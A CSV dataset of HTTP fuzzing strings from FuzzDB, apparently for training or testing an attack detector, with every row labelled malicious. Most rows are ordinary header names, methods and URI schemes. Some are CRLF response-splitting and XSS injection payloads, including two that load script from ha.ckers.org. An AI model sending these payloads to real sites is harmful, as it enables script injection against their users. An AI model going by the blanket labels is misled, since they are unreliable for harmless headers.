Payload,Signature,AttackType,Severity,MITRE,Label,Description
MKCOL,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
xmlrpc.beep :,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Accept-Charset,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sms:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
SUBSCRIBE,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris.xpc:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Content-Security-Policy,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
CHECKIN,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Proxy-Authorization,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-Unmodified-Since,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
modem:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Location,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BPROPFIND,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
xfire:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
aaas:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Origin,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
tag:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0a,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
go:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ws:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
tv:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1&#38;id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Expires,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
msrps:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
maps:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
lastfm:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1&id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/1.22 (compatible; MSIE 2.0d; Windows NT),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
;id=1?id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ARBITRARY,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3Ehttp://www.test.com,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Age,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
snmp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=id=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (PLAYSTATION 3; 1.00),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
CONNECT,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Referer,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sips:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
gopher:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Opera/9.27 (Windows NT 5.1; U; en),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
OPTIONS,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
shttp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id[]=1&id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1%c0%a6id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
im:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ftp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
wss:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
cvs:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1\uc0a6id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
javascript:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1%2526id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
RPC_OUT_DATA,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
dns:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
GET,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Cache-Control,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
data:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
lsid:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
apt:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
rtmp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
pop:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
imap:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
CHECKOUT,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
paparazzi:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Public-Key-Pins,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1&amp;id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-WebKit-CSP,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
soap.beeps:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Language,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
gizmoproject:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
????id=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Accept-Ranges,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
message:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1#id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
irc6:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BDELETE,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-None-Match,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
cid:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Strict-Transport-Security,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ut2004:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
platform:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
dav:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
beshare:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
PUT,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/2.0 (compatible; MSIE 3.02; Update a; Windows NT),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 4.01; Windows NT),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
teamspeak:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Retry-After,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
about:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
xmpp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ACL,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
tip:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id===1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.14) Gecko/20080520 Firefox/2.0.0.14,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
bitcoin:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Range,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
crid:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
content:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Pragma,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sieve:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
rsync:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
skype:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
wtai:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
msnim:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
BASELINE-CONTROL,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
&id=1;id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
INDEX,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
irc:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
adiumxtra:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
gtalk:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
bolo:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
rmi:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
soldat:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Frame-Options,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ldap:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
vemmi:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Allow,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sip:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ETag,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
h323:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
DNT,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Encoding,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Access-Control-Allow-Origin,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Forwarded-Proto,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
MKACTIVITY,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Via,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Wget/1.8.2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
\r\n,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
P3P,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Last-Modified,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Front-End-Https,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
msrp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
telnet:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
VERSION-CONTROL,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iax:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
r%0d%0aContentLength:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContentType:%20text/html%0d%0aContentLength:%2019%0d%0a%0d%0a<html>Injected%02Content</html>,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-Length,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
UNCHECKOUT,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Forwarded-Host,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
service:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Transfer-Encoding,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.19) Gecko/20081204 SeaMonkey/1.1.14,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
chrome:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
doi:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
palm:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Authorization,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ventrilo:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
webcal:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
SEARCH,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Proxy-Connection,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
UNLOCK,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
DEBUG,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Proxy-Authenticate,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mtqp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
coap:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0a%0d%0a%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2Fscript%3E,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
wyciwyg:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%0d%0a%0d%0a%3Chtml%3E%3Cbody%3E%3C%2Fbody%3E%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fs.js%3E%3C%2Fscript%3E%3Cscript%3Ealert(%22location.host%20is:%20%22%2Blocation.host)%3C%2Fscript%3E%3C%2Fhtml%3E,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1%u0026;id=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris.xpcs:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
fish:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris.lws:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
wais:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-Modified-Since,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
%22%3E%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E%3C%22,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id[1&id=2]=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
info:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
0x0D0x0A,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
xmlrpc.beeps:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
callto:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
tel:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
finger:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
steam:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
itms:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
spotify:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=1%26id%3D2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mvn:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.7) Gecko/20070606,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id['&id=1']=2,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
tftp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
MKWORKSPACE,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Http-Method-Override,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ipp:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
market:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
&&&&id=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
PROPPATCH,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ircs:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Upgrade,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
cap:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ed2k:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
proxy:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
thismessage:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
If-Match,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
